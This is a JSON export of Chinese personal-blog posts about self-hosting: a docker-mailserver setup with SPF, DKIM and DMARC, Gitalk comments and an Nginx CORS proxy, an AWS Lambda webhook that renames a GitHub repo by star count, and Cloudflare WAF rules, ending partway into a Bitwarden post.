/etc/localtime:/etc/localtime:ro\n    restart: always\n    stop_grace_period: 1m\n    # Uncomment if using `ENABLE_FAIL2BAN=1`:\n    cap_add:\n      - NET_ADMIN\n    healthcheck:\n      test: \"ss --listening --tcp | grep -P 'LISTEN.+:smtp' || exit 1\"\n      timeout: 3s\n      retries: 0\n```\n\n这里我将主机上已经有的域名证书直接挂载到了容器内，以便容器内的邮件服务对其进行读取，如果还没有证书，则也可以在后面设置用Let's Encrypt获取。\n\n\n另外添加了POP3的两个端口映射。\n\n\n---\n\n修改mailserver.env：\n\n```ini\n...\nENABLE_POP3=1  # 开启POP3协议\n...\nSSL_TYPE=manual  # 指定SSL证书类型，manual表示手动指定路径，这里可以改成letsencrypt（自动获取）\n\n# 如果是manual，则手动填写下面的路径\nSSL_CERT_PATH=/path/to/fullchain.pem\nSSL_KEY_PATH=/path/to/privkey.pem\n```\n\n### 设置邮件账户\n\n\n这个邮件服务在启动之前得预先设置一个邮件账户。\n\n```bash\n./setup.sh email add admin@mail.example.com password\n./setup.sh alias add postmaster@mail.example.com admin@mail.example.com\n```\n\n创建了一个admin用户（不一定得是admin），然后添加了一条alias将postmaster用户指向它。\n\n\n### 添加额外的DNS解析\n\n\n接下来需要添几条与邮件安全相关的DNS。\n\n\n- SPF记录\n\n\n> **发件人策略框架**（英语：**Sender Policy Framework**；简称**SPF**； RFC 4408）是一套电子邮件认证机制，可以确认电子邮件确实是由网域授权的邮件服务器寄出，防止有人伪冒身份网络钓鱼或寄出垃圾电邮。SPF允许管理员设定一个DNS TXT记录或SPF记录设定发送邮件服务器的IP范围，如有任何邮件并非从上述指明授权的IP地址寄出，则很可能该邮件并非确实由真正的寄件者寄出（邮件上声称的“寄件者”为假冒）。\n> \n> \n> [维基百科：SPF](https://zh.wikipedia.org/wiki/%E5%8F%91%E4%BB%B6%E4%BA%BA%E7%AD%96%E7%95%A5%E6%A1%86%E6%9E%B6)\n\n`TXT mail -> \"v=spf1 a mx ip4:1.2.3.4 ~all\"`\n\n\nSPF语法详见[此链接](http://www.open-spf.org/SPF_Record_Syntax/)。\n\n\n- DMARC记录\n\n\n> **基于域的消息认证，报告和一致性**（英语：**Domain-based Message Authentication, Reporting and Conformance**，简称**DMARC**）是一套以SPF及DKIM为基础的电子邮件认证机制，可以检测及防止伪冒身份、对付网络钓鱼或垃圾电邮。\n> \n> \n> [维基百科：DMARC](https://zh.wikipedia.org/wiki/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E7%9A%84%E6%B6%88%E6%81%AF%E8%AE%A4%E8%AF%81%EF%BC%8C%E6%8A%A5%E5%91%8A%E5%92%8C%E4%B8%80%E8%87%B4%E6%80%A7)\n\n`TXT _dmarc.mail -> \"v=DMARC1; p=quarantine; sp=none; fo=0; adkim=r; aspf=r; pct=100; rf=afrf; ri=86400; rua=mailto:postmaster@mail.example.com; ruf=mailto:postmaster@mail.example.com\"`\n\n\nDMARC的详细配置见[此链接](https://github.com/internetstandards/toolbox-wiki/blob/main/DMARC-how-to.md#overview-of-dmarc-configuration-tags)。\n\n\n- DKIM记录\n\n\n> **域名密钥识别邮件**（英语：**DomainKeys Identified Mail**，简称**DKIM**）是一套电子邮件认证机制，使用公开密钥加密的基础提供了数字签名与身份验证的功能，以检测寄件者、主旨、内文、附件等部分有否被伪冒或窜改。\n> \n> \n> [维基百科：DKIM](https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E5%AF%86%E9%92%A5%E8%AF%86%E5%88%AB%E9%82%AE%E4%BB%B6)\n\n\n这个相当于将公钥通过DNS解析的方式分发到客户端，发件服务器用私钥签名，从而收件方可验证来源。\n\n```bash\n./setup.sh config dkim\n\ncat docker-data/dms/config/opendkim/keys/mail.example.com/mail.txt\n```\n\n将`cat`得到的`( \"`与`\" )`之间的内容（记为X）解析到DNS：\n\n\n`TXT mail._domainkey.mail -> X`\n\n\n---\n\n如果可以的话，再设置一条PTR记录（DNS反向解析记录），用以降低被识别为垃圾邮件的概率。（然而腾讯云轻量应用服务器不给解析，就此作罢。）\n\n![](https://oss.fyz666.xyz/blogfiles/png/6f5e6a22c0ea026754c435320961ced8.png)\n### 启动服务\n\n\n在启动服务之前，由于一个[也许是feature的bug](https://github.com/docker-mailserver/docker-mailserver/issues/2545)，我们需要给容器打一个[patch](https://github.com/docker-mailserver/docker-mailserver/issues/2545#issuecomment-1097590082)：\n\n```bash\n#! /bin/bash\n##\n## to match what should be escaped whitespaces are escapted with \\s and the other character with \\character\n## the final string does not need to be escaped\nsed -i 's/mydestination\\s=\\s\\$myhostname,\\slocalhost\\.\\$mydomain,\\slocalhost/mydestination=localhost.$mydomain,localhost/g' /etc/postfix/main.cf\n\necho \"user-patches.sh successfully executed with custom main.cf hotfix\"\n```\n\n将上述脚本放置在`docker-data/dms/config/user-patches.sh`，然后：\n\n```plaintext\ndocker compose up -d\n```\n\n可以前往[这个网站](https://www.checktls.com/TestReceiver)测试一下tls是否可用。\n\n\n实测该服务占用内存在100M左右，可以说是非常轻量了：\n\n![](https://oss.fyz666.xyz/blogfiles/png/ccdbb9f72cb72b3f22b9dd6d310c8f2e.png)\n## 部署起来了，然而怎么使用？\n\n\n这个邮件服务器并没有自带的web服务，因此我们需要使用第三方客户端来登录账号，进行邮件收发。\n\n\n使用Python脚本通过587端口发邮件：\n\n```python\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom email.utils import formatdate\n\n\nmail_host = 'mail.example.com'\nmail_user = 'admin@mail.example.com'\nmail_pass = 'password'\nsender = 'FBI'\nreceivers = ['admin@mail.114514.com']\n\ncontent = \"\"\"Open the door!!!\"\"\"\nmessage = MIMEText(content, 'plain', 'utf-8')\nmessage['Subject'] = 'Your email has been hacked!'\nmessage['From'] = sender\nmessage['To'] = receivers[0]\nmessage['Date'] = formatdate()\n\nserver = smtplib.SMTP(mail_host, 587)  # 连接587端口\nserver.ehlo()\nserver.starttls()  # 开启tls\nserver.login(mail_user, mail_pass)\nserver.sendmail(sender, receivers, message.as_string())\n\nserver.quit()\n```\n\niOS邮箱app：\n\n![](https://oss.fyz666.xyz/blogfiles/jpg/daae7a2dfc0bb3254ab03f63a310f677.jpg)\n后续设置中，将发件服务器端口设置为587或者465，勾选SSL。\n\n\n---\n\n最后，可以在[这个网站](https://www.appmaildev.com/cn/dkim)对上面设置的DKIM、SPF等进行测试：\n\n![](https://oss.fyz666.xyz/blogfiles/png/14b1091c9c434b0cfa192e4a4fd7bf3c.png)\n以及[这个网站](https://www.mail-tester.com/)，可以进一步测试邮件的得分：\n\n![](https://oss.fyz666.xyz/blogfiles/png/a0c2f4d194410ec75ac27e100222f5df.png)\n\n![](https://oss.fyz666.xyz/blogfiles/png/edc8dedc399fae1343875e12fd967eca.png)\n很遗憾，我的`.xyz`域名被识别为了`SUSPICIOUS_NTLD`，再加上用不上rDNS，估计会被以很高的置信度丢进垃圾箱了 🙁 以后再改进！\n","tags":["Docker","Email","Docker-mailserver"],"categories":["瞎捣鼓经历"]},{"title":"Gitalk发起Oauth时无法完成跨域请求的问题","url":"//blog/9864/","content":"\n我的博客接入Gitalk之后，经常会遇到Gitalk登录失败的问题，表现为Gitalk组件长时间转圈加载不出来，一段时间后渲染出Network Error等字样。\n\n经过研究，发现是因为Gitalk在发起跨域请求时，其默认的代理出了问题，详情可见[此issue](https://github.com/gitalk/gitalk/issues/514)。\n\n```raw\nhttps://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token\n```\n\n上面这个跨域代理的域名已经被墙了，在没有科学上网环境或网络环境差的时候就会寄。\n\n\n于是我们可以自己整一个代理，方案有几种，如果没有云服务器，可以找一些免费的托管平台来搞一个代理，例如Vercel，可参考[这篇文章](https://prohibitorum.top/7cc2c97a15b4.html)\n\n\n不过实际体验了一下，我发现vercel的域名好像也被墙了（DNS污染）。。。\n\n\n考虑到我的网站是用Nginx部署在自己的云服务器上的，并且我的云服务器在境外，可以直连GitHub，因此我采用了另一种更加方便的方案，即用Nginx来转发跨域请求（参考自[这篇文章](https://blog.weiyigeek.top/2022/8-17-682.html)）。\n\n\n在网站的Nginx配置下加一条`location`字段：\n\n```nginx\nlocation /github {\n    if ($request_method = 'OPTIONS') {\n      return 204;\n    }\n    proxy_pass https://github.com/;\n}\n```\n\n然后`nginx -s reload`重新加载配置。\n\n\n最后只要配置一下Gitalk组件，加一个`proxy`参数：\n\n```js\nconst gitalk = new Gitalk({\n    clientID: 'xxxxxxxxxxxxxxxx',\n    clientSecret: 'xxxxxxxxxxxxxxxx',\n    body: location.href,\n    repo: 'BlogComments',\n    owner: 'windshadow233',\n    admin: ['windshadow233'],\n    createIssueManually: true,\n    id: location.pathname,\n    distractionFreeMode: false,\n    proxy: '/github/login/oauth/access_token'\n});\n```","tags":["Nginx","CORS","Oauth","Gitalk"],"categories":["Debug"]},{"title":"博客接入Gitalk评论系统","url":"//blog/9827/","content":"\n{% note info %}\n\n2024-04-21 更新: 基于GitHub Issue的评论系统在嵌套评论时叠金字塔的行为太丑了，于是我已经将评论系统换成了基于GitHub Dissussion的[Giscus](https://github.com/giscus/giscus)。\n\n{% endnote %}\n\n自从开始写这个博客以来，我就嫌博客主题自带的评论系统太丑，又懒得大改CSS，于是我的博客一直没有开启评论功能。\n\n但忽然觉得不开评论区好像过于冷清<s>（虽然开了也不怎么会有人评论）</s>，然而我又不是很希望访客的评论占用数据库，因此我打算看看能不能整一个Serverless的评论系统。\n\n\n最近接触了下GitHub REST API，于是想了一下，觉得既然GitHub的API那么方便，那为什么不试试把GitHub的Issue系统渲染到自己的网页上当评论系统用呢？（之前听说过有人拿GitHub当云存储的，~~简直就是人才~~）\n\n\n考虑到受众群体应该不会有人没有GitHub账号，感觉这个想法很不错，然而当我研究的如火如荼之时，突然在网上搜到了别人已经造好的轮子：[Gitalk](https://github.com/gitalk/gitalk)。~~草，果然。~~\n\n![](https://oss.fyz666.xyz/blogfiles/png/9c32e2867c784770c9937826c6403bf6.png)\n那何不拿来主义？毕竟我也比较讨厌写前端代码。于是我啪就整起来了，很快啊！就把Gittalk接入了一下，说实话这个评论系统的前端还挺不错的，基本契合我用的主题，稍微改了一下夜间模式下的样式就OK了。\n\n\n接入的方法已经在[官方文档](https://github.com/gitalk/gitalk/blob/master/readme.md)中写的非常详细了，我则加了几条夜间模式CSS：\n\n```css\n.darkmode--activated .gt-comment-content{\n    background: black!important;\n}\n.darkmode--activated .gt-comment-content p, .darkmode--activated .gt-comment-body{\n    color: white!important;\n}\n.darkmode--activated .gt-popup{\n    background: black!important;\n}\n.darkmode--activated .gt-header-preview{\n    background: black!important;\n    color: white!important;\n}\n```\n\n配置：\n\n```js\nconst gitalk = new Gitalk({\n    clientID: 'xxxxxxxxxxxxxxxx',\n    clientSecret: 'xxxxxxxxxxxxxxxx',\n    body: location.href,\n    repo: 'BlogComments',\n    owner: 'windshadow233',\n    admin: ['windshadow233'],\n    createIssueManually: true,\n    id: location.pathname,\n    distractionFreeMode: false\n});\ngitalk.render('gitalk-container');\n```\n\n根据[这条解释](https://github.com/imsun/gitment?tab=readme-ov-file#about-security)，把secret泄漏了似乎也并没有什么问题。\n","tags":["GitHub API","Gitalk"],"categories":["博客相关"]},{"title":"一个随Star数动态变化的GitHub仓库","url":"//blog/9506/","content":"\n几年前曾看到过@iBug大佬的[一个GitHub仓库](https://github.com/iBug/This-Repo-Has-0-Stars)，这个仓库的名字以及描述会实时显示当前的Star数量，令当时的我觉得非常有意思，不过那会我并没有去研究原理。几年过去了，却不知昨天为啥突然想到，于是读了一下大佬的[文章](https://ibug.io/p/41)，试着复现了一下。\n\n我复现的仓库链接如下：\n\n{% link This Repo Has 0 Stars,GitHub,https://github.com/windshadow233/This-Repo-Has-0-Stars %}\n\n朋友们可以进去点个star看看效果～~~（没想到我第一次骗star竟是为这）~~\n\n![](https://api.star-history.com/svg?repos=windshadow233/This-Repo-Has-0-Stars&type=Date)\n\n\n---\n\n项目很简单，但其背后的原理覆盖了一些我之前没有接触过的东西，例如GitHub REST API、Webhook（这个倒是在做telegram bot的时候接触过）、AWS Lambda等。如果能熟练利用，感觉会是个很高效、很方便的辅助工具。由于iBug大佬的文章省略了好多「有手就行」但我不会的内容，所以在过程中踩了一些坑，因此我来水篇文章，更详细地记录一下。\n\n\n## 实现原理\n\n\n这个东西的原理其实就是，使用GitHub自带的Webhook，监听仓库的各种事件（如本例监听的是「Star」事件），一旦事件发生，则自动推送消息到指定的URL，通过URL背后的代码来调用GitHub REST API，从而实现在Star数更新时自动修改GitHub repo名。我们可以自定义该URL，为降低复杂度、提升维护的便利性，选择使用AWS Lambda这种Serverless的服务。\n\n\n## 创建GitHub Repo并添加Webhook\n\n\n第一步自然是需要把仓库建立起来，可以随便起个名，例如“This-Repo-Has-0-Stars”。然后前往仓库的「Settings->Webhooks」标签，点击「Add webhook」。\n\n\n- Payload URL：推送消息的目的地址，这里我们还没有申请AWS的API，先不管。\n- Content type：我比较喜欢用JSON，于是我选择了「application/json」，实际也就是写代码的时候略有区别。\n- Secret：Webhook的签名字符串，可用来验签，可以不填，不过还是建议用密码生成器来生成一个。\n- Which events would you like to trigger this webhook? 由于我们的目的是监听Star事件，因此这里选择「Let me select individual events」，然后在下面的列表中取消勾选「Pushes」，勾选「Stars」。\n\n于是还剩Payload URL没有配置，暂时先放着，进入下一步。\n\n\n## 创建GitHub Access Token\n\n\n为通过GitHub REST API修改仓库名，需要搞一个token用来鉴权。[此处前往token申请页面](https://github.com/settings/tokens)\n\n![](https://oss.fyz666.xyz/blogfiles/png/0b842b41077a21768b19fdc4c6077292.png)\n如上，申请一个用于管理repo的token，将其保存下来。\n\n\n## 创建AWS Lambda函数\n\n\n由于之前发生过一次因不了解AWS平台的计费方式而白白浪费了100多rmb的惨痛经历，于是这次我提前摸清了套路：\n\n![](https://oss.fyz666.xyz/blogfiles/png/b16be8fe50b9ab5a3604ba02f66e490c.png)\n作为一个娱乐项目肯定稳稳够用了。\n\n\n前往[AWS控制台](https://console.aws.amazon.com/)，在「服务」中搜索lambda：\n\n![](https://oss.fyz666.xyz/blogfiles/png/fc6f1e676e40023f54d6e7325436c326.png)\n创建一个lambda函数，并选择你喜欢的编程语言<s>（Python 3.8）</s>：\n\n![](https://oss.fyz666.xyz/blogfiles/png/141591ad60ec1fdd621d28e451bd0d1b.png)\n点「创建函数」即可。进入代码页，发现它为我们提供了最基础的（Python）代码：\n\n```python\nimport json\n\ndef lambda_handler(event, context):\n    # TODO implement\n    return {\n        'statusCode': 200,\n        'body': json.dumps('Hello from Lambda!')\n    }\n\n```\n\n不过它好像并不能直接使用，而是要通过AWS其他地方的接口来调用，这个东西称为[AWS API Gateway](https://console.aws.amazon.com/apigateway/main)。\n\n## 配置AWS API Gateway\n\n![](https://oss.fyz666.xyz/blogfiles/png/2a2cd66dca325096ccd7276f47b61194.png)\n这玩意则是收费的，不过很便宜，不公开接口的话应该开销不大。\n\n\n点击「创建API」，并选择「HTTP API」：\n\n![](https://oss.fyz666.xyz/blogfiles/png/2668837da3012db8132b8b54eca98177.png)\n添加一个Lambda集成，并选择前面创建的Lambda函数，最后点「下一步」：\n\n![](https://oss.fyz666.xyz/blogfiles/png/cd50a23967f4337dc5a68819594e0aed.png)\n配置路由，按iBug大佬[所说](https://ibug.io/cn/2021/02/github-webhook-on-aws-lambda/#api-gateway)，填写$default：\n\n![](https://oss.fyz666.xyz/blogfiles/png/1a33ef7f7dbe11a28a33701994de02ac.png)\n这样便创建好了一个HTTP API，AWS为其分配了一个ID，即下面的87z7tufbtk：\n\n![](https://oss.fyz666.xyz/blogfiles/png/fbe85d2db6553829ed92f5a0d3fe52b6.png)\n可以通过下面的方法简单测试一下：\n\n```bash\n$ curl https://87z7tufbtk.execute-api.us-east-1.amazonaws.com/\n\"Hello from Lambda!\"%\n```\n\n这串URL：`https://87z7tufbtk.execute-api.us-east-1.amazonaws.com/` 也正是前面创建webhook时留着没填的那个Payload URL。\n\n## 编写Lambda函数\n\n\n刚刚的接口测试说明Lambda函数已经work了，于是需要编写一下这个Lambda函数以使其达到我们想要的效果——获取到repo的star数，然后把它的名字、描述改了。这里的参数研究等过程建议直接阅读[iBug大佬的文章](https://ibug.io/cn/2021/02/github-webhook-on-aws-lambda/#lambda-code)，我就直接贴完整的代码了（此代码修改自iBug大佬的代码，也可以在[我的仓库](https://github.com/windshadow233/This-Repo-Has-0-Stars)里看到）\n\n### 代码\n\n```python\nimport base64\nimport hashlib\nimport hmac\nimport os\nimport json\n\nimport requests\n\n\nGITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')\nSECRET = os.environ.get('SECRET')\n\n\ndef lambda_handler(event, context):\n    path = event['rawPath']\n    if 'body' in event:\n        if event['isBase64Encoded']:\n            body = base64.b64decode(event['body'])\n        else:\n            body = event['body'].encode()\n    else:\n        body = b\"\"\n    signature = event['headers']['x-hub-signature-256'].split(\"=\")[1]\n    hashsum = hmac.new(SECRET.encode(), msg=body, digestmod=hashlib.sha256).hexdigest()\n    if hashsum != signature:\n        return {\n            'statusCode': 401,\n            'body': 'Bad signature'\n        }\n    if path == \"/\":\n        # https://docs.github.com/en/developers/webhooks-and-events/webhook-events-and-payloads#star\n        payload = json.loads(body)\n        repository = payload['repository']\n        repository_url = repository['url']\n        stars = repository['stargazers_count']\n\n        new_name = f\"This-Repo-Has-{stars}-Star{'s' if stars != 1 else ''}\"\n        new_description = f\"Thanks for stopping by! This repository now has {stars} star{'s' if stars != 1 else ''}~🌟🌟🌟\"\n        headers = {'Authorization': f\"Bearer {GITHUB_TOKEN}\"}\n        data = {\n            'name': new_name,\n            'description': new_description\n        }\n        response = requests.patch(repository_url, headers=headers, json=data)\n        return {'statusCode': response.status_code, 'body': \"OK\"}\n    else:\n        return {'statusCode': 404, 'body': \"\"}\n```\n\n### 配置环境变量\n\n\n注意到代码最前面读取了俩环境变量，GITHUB_TOKEN和SECRET分别是前面申请的GitHub Access Token和Webhook Secret字符串，为在代码中获取，需要将其设置在Lambda函数的「配置->环境变量」标签栏下：\n\n![](https://oss.fyz666.xyz/blogfiles/png/557096d4f67f0052976cbd52facca6d6.png)\n### 添加第三方库\n\n\n设置完上面的内容后，我给仓库点了个star，然而\n\n![](https://oss.fyz666.xyz/blogfiles/png/5385911526e61a25e9cd3b8d833ed57b.png)\ndebug了半天发现原来是Lambda函数的Python 3.8环境没有第三方库，例如requests，于是要想办法把第三方库集成进去。\n\n\n研究了一会，发现Lambda提供一种叫「层」的功能：\n\n![](https://oss.fyz666.xyz/blogfiles/png/584646ce929f46a1f6c31e942b764a3d.png)\n通过添加「层」，可以将第三方库打包添加进去。下面先打包第三方库。\n\n\n在本地的Python 3.8环境中执行下述命令，得到python目录，将该目录打包为python.zip\n\n```bash\npip install --target ./python requests urllib3==1.26.16\n```\n\n然后「创建层」：\n\n![](https://oss.fyz666.xyz/blogfiles/png/8178a6c7d9f32019c89b8f0e1c3a6dbd.png)\n名称可以随意填写，点击「上传」按钮，将前面的python.zip上传，选择几个合适的运行时，点击「创建」。\n\n\n回到Lambda的「代码」部分，拉到最底下，有一块「层」区域：\n\n![](https://oss.fyz666.xyz/blogfiles/png/b9d8d8e1ba41b8aef4a78192b751ccb3.png)\n我们在这里添加刚刚创建的层，即可让Python环境拥有requests。\n\n![](https://oss.fyz666.xyz/blogfiles/png/b3e4598f853c256a1a6f3021bcdda2e8.png)\n\n\n---\n\n## 最后\n\n\n到了这里，这个会自动随star数更新名字和描述的repo就已经做完了。不过其中所用到的技术，仍有很大的应用空间尚未研究，「下次一定」找个机会多玩玩！\n","tags":["Python","API GateWay","AWS Lambda","GitHub API","Webhook"],"categories":["杂趣"]},{"title":"使用Cloudflare为网站部署免费的防御措施","url":"//blog/9307/","content":"\n我决定给我的博客套一层Cloudflare。\n\n\n> “不是，你网站那点访问量套个der的cf啊？”\n> \n> \n> “我之前也觉得没必要，但为什么我这么小的站都有人来搞事啊。。。看来还是有必要上一下防了。反正Cloudflare有free plan，那个够好用了，不用白不用。”\n\n\n## 发生肾磨石了？\n\n朋友们好啊，我是本博客的博主。\n\n刚才有个朋友问我，你的个人博客为肾磨访问不了了，我说怎么回事？给我发了几张服务器无响应的截图，我一看Nginx日志，哦！源赖氏港才，有两个IP地址，非常可疑，一个请求90多万次，一个请求80多万次。\n\n我一看这请求量！啊…我的服务器CPU占用率直线上升，到了100%，诶…服务器扛不住了，我说这是怎么回事。我说你这个请求来得太频繁了，不能这么搞，他不理我。我说小朋友你看这个CPU负载，他看都不看。他说你这也没什么办法。我说我这个有办法，得用防火墙拦截全部流量，传统运维是讲防御的，四两拨千斤，二百多万的每分钟请求数都敌不过我这一条防火墙规则啊…哈！他非得继续攻击，我说可以。\n\n诶…我一说他脚本啪就跑起来了，很快啊！然后上来就是，一个拒绝服务，一个CC攻击，一个API滥用！\n\n我全部防出去了，防出去了啊，防出去以后自然是赛博攻防以点到为止，封了他的IP，未进一步采取行动。我笑一下，准备降低防火墙的防御级别。\n\n因为这时间，按传统赛博攻防的点到为止，他已经输了，如果不解封IP，他这些IP永远访问不到我的网站。\n\n他也承认我先封了他IP。他承认我先封了他IP，啊！我降低防火墙级别的时间不拦截了，他突然换了几个IP地址来继续攻击，啊，我大E了啊，没有闪。\n\n诶…他的新IP地址给我服务器，啊，一瞬间，过载了一下，但没关系啊！几分钟以后，当时我紧急优化防火墙规则了，我说停停。然后几分钟以后，CPU负载就稳住了。\n\n我说小伙子你不讲武德你不懂，他忙说对不起对不起，我不懂技术，啊，我是…他说他是随便试试的。\n\n他可不是随便试试的啊，DoS、CC、API攻击，训练有素，后来他说他学过三四年网络安全，啊，看来是有bear来。\n\n这个攻击者，不讲武德，\n\n来，扫！\n\n来，过载！\n\n我1核2G的低配服务器。这好吗？这不好。\n\n我劝！这位攻击者耗子尾汁，好好反思，以后不要再犯这样的聪明，小聪明啊，额…互联网要以和为贵，要讲武德，不要搞窝里斗。\n\n谢谢朋友们！\n\n（以上内容存在一定的艺术创作成分）\n\n\n---\n\n虽然风波暂时过去了，但这让我意识到即使是我这种平时根本没有访问量的小站，也有必要部署一些防御措施来抵御这类偶发的高频请求。\n\n\n说起网站防御，那必不能不提Cloudflare，其提供的free plan对于我这样的个人建站者而言，已经足够好用了。不过由于是第一次使用这类工具，缺少一些经验，因此花了一点时间，下面把部署过程记录一下。\n\n![](https://oss.fyz666.xyz/blogfiles/png/b7bea3941069ffed98f5e68ca6432b86.png)\n## DNS托管\n\n\n首先注册一个Cloudflare账号，选择free plan（对于小网站而言已经足够）。第一步需要将DNS服务器设置为Cloudflare提供的两个名称服务器：\n\n![](https://oss.fyz666.xyz/blogfiles/png/26e068616a73723e5bffe8dbde599c9d.png)\n该步骤需要前往之前的域名DNS服务提供商进行更改，更改成功后，需要将原先的所有DNS记录都托管到Cloudflare的DNS解析服务下。更改DNS名称服务器及解析这一步需要等上一段时间，激活成功后，Cloudflare会发一封邮件到注册邮箱：\n\n![](https://oss.fyz666.xyz/blogfiles/png/0972b39a2668f07cb4d8ad6e9ea49b16.png)\n## 设置CDN\n\n\nDNS解析完成后，此时我们仅仅使用了Cloudflare的DNS解析功能，还没有为站点激活防御措施。为了激活该功能，我们需要为需要的二级域名开启代理状态，如下图为本站域名的DNS配置：\n\n![](https://oss.fyz666.xyz/blogfiles/png/05fa0bfc01c2f2a6fbc63e5b0a91b9f9.png)\n## 设置SSL/TLS\n\n\n如果你的站点本身具有TLS证书，那么需要在「SSL/TLS->概述」中将加密模式设置为 完全（严格），否则在访问站点时会报“重定向次数过多”。\n\n\n## 配置WAF\n\n\n下文的WAF部署过程参考了[这篇文章](https://www.2dan.cc/archives/cloudflare-rule.html)，在此致谢！\n\n\n在「安全性->WAF」设置下依次配置「自定义规则」、「速率限制规则」\n\n\n### 自定义规则\n\n\n免费用户支持五条自定义规则，适合每个网站的WAF配置都不一样，不过可以先配置三条较为通用的：\n\n\n- 白名单\n\n根据需求定义一个白名单，首先可以放行一些经Cloudflare验证的自动程序，比如谷歌、百度的爬虫等。\n\n```plaintext\n(cf.verified_bot_category in {\"Search Engine Crawler\" \"Search Engine Optimization\" \"Monitoring & Analytics\" \"Advertising & Marketing\" \"Page Preview\" \"Academic Research\" \"Security\" \"Accessibility\" \"Webhooks\" \"Feed Fetcher\" \"AI Crawler\" \"Aggregator\" \"Other\"})\n```\n\n操作选择「跳过」，要跳过的 WAF 组件可以全勾上，我则去掉了两个速率限制规则。\n\n\n其他的IP白名单等，可自行根据需求来定义。\n\n\n- ASN质询\n\n对一些常见数据中心服务商的ASN自治网络进行验证。\n\n```plaintext\n(ip.geoip.asnum in {174 195 209 577 792 793 794 1215 1216 1217 2497 2914 3223 3255 3269 3326 3329 3457 3462 3598 4184 4190 4637 4694 4755 4785 4788 4816 4826 4835 5056 5610 5617 6471 6584 6830 6876 6877 6939 7029 7224 7303 7489 7552 7684 8068 8069 8070 8071 8074 8075 8100 8220 8560 8881 8987 9009 9299 9312 9370 9534 9678 9952 9984 10026 10453 11351 11426 11691 12076 12271 12334 12367 12874 12876 12989 14061 14117 14140 14576 14618 15169 16276 16509 16591 16629 17043 17428 17707 17788 17789 17790 17791 18013 18228 18403 18450 18599 18734 18978 19527 19740 20207 20473 20552 20554 20860 21704 21769 21859 21887 22773 22884 23468 23724 23885 23959 23969 24088 24192 24424 24429 24940 25429 25697 25820 25935 25961 26160 26496 26818 27715 28429 28431 28438 28725 29066 29286 29287 29802 30083 30823 31122 31235 31400 31898 32097 32098 32505 32613 34081 34248 34549 34947 35070 35212 35320 35540 35593 35804 35816 35908 35916 36351 36352 36384 36385 36444 36492 36806 37963 37969 38001 38197 38283 38365 38538 38587 38588 38627 39284 40065 40676 40788 41009 41096 41264 41378 42652 42905 43289 43624 43989 45011 45012 45062 45076 45085 45090 45102 45102 45102 45103 45104 45139 45458 45566 45576 45629 45753 45899 45932 46484 46844 47232 47285 47927 48024 48024 48337 48905 49327 49588 49981 50297 50340 50837 51852 52000 52228 52341 53089 54463 54538 54574 54600 54854 54994 55158 55330 55720 55799 55924 55933 55960 55967 55990 55992 56005 56011 56109 56222 57613 58073 58199 58461 58466 58519 58543 58563 58593 58772 58773 58774 58775 58776 58844 58854 58862 58879 59019 59028 59048 59050 59051 59052 59053 59054 59055 59067 59077 59374 60068 60592 60631 60798 61154 61317 61348 61577 61853 62044 62240 62468 62785 62904 63018 63023 63075 63288 63314 63545 63612 63620 63631 63655 63677 63678 63679 63727 63728 63729 63835 63838 63888 63916 63949 64050 131090 131106 131138 131139 131140 131141 131293 131428 131444 131477 131486 131495 132196 132203 132509 132510 132513 132591 132839 133024 133199 133380 133478 133492 133746 133752 133774 133775 133776 133905 133929 134238 134327 134760 134761 134763 134764 134769 134770 134771 134835 134963 135061 135290 135300 135330 135377 135629 137693 137697 137699 137753 137784 137785 137787 137788 137876 137969 138366 138407 138607 138915 138949 138950 138952 138982 138994 139007 139018 139124 139144 139201 139203 139220 139316 139327 139726 139887 140096 140596 140701 140716 140717 140720 140723 140979 141157 141180 142570 149167 177453 177549 197099 197540 198047 198651 199490 199506 199524 199883 200756 201094 201978 202053 202675 203087 204601 204720 206092 206204 206791 206798 207319 207400 207590 208425 208556 211914 212708 213251 213375 262187 263022 263196 263639 263693 264344 264509 265443 265537 266706 267784 269939 270110 328608 394699 395003 395936 395954 395973 398101 })\n```\n\n操作选择了「JS质询」。\n\n\n- 风险IP质询\n\n创建一个风险IP列表，利用Cloudflare提供的威胁分数和这个IP列表来判断IP的危险度，由于列表过大，需要先通过「管理账户->配置->列表」创建一个IP列表，为方便起见，可以从下面提供的CSV文件下载该列表并导入。\n\n<a target=\"_blank\" href=\"https://oss.fyz666.xyz/blogfiles/csv/5224de023a5d29f7e7a649a40a23aacf.csv\" download=\"badip.csv\">badip.csv</a>\n\n然后添加下面规则：\n\n```plaintext\n(ip.src in $badip and cf.threat_score gt 30)\n```\n\n操作同样选择了「JS质询」。\n\n\n### 速率限制规则\n\n\n免费用户支持配置一条速率限制规则，我们可以根据服务器的情况来进行配置，我这里配置如下：\n\n\n`(http.request.uri.path eq \"/\")`\n\n\n当速率超过50次/10秒时触发。免费用户只支持一种操作，即「阻止」，响应方式选择了「默认 Cloudflare 速率限制响应」。\n\n\n## 其他配置\n\n「安全性→设置→安全级别」：高（在网站受攻击时可以使用「I'm Under Attack!」）  \n「安全性→设置→质询通过期」：15分钟或者30分钟，受到攻击较严重时则可以设置到5分钟  \n「安全性→设置→浏览器完整性检查」：打开\n\n\n「安全性→DDoS→HTTP DDoS 攻击防护」：\n\n![](https://oss.fyz666.xyz/blogfiles/png/26e293e9f7522a09d047c5c79a54879c.png)\n「安全性→自动程序」：打开自动程序攻击模式。\n","tags":["计算机网络","Cloudflare","防火墙"],"categories":["博客相关"]},{"title":"重塑密码管理体系——Bitwarden服务端自部署","url":"//blog/9235/","content":"\n经常问我借账号的朋友都知道，我这个人记性不好，也因此，我所有平台的密码都长的大同小异（基本都是由同一个字符串通过变换字母大小写、截取子串，或者添加一两个特殊符号得来的）。\n\n## 使用相似密码的坏处\n\n\n像我这样在各平台用相似度极高的密码，虽然方便了记忆，但后果也很严重：[某些不负责任的平台<i class=\"iconfont 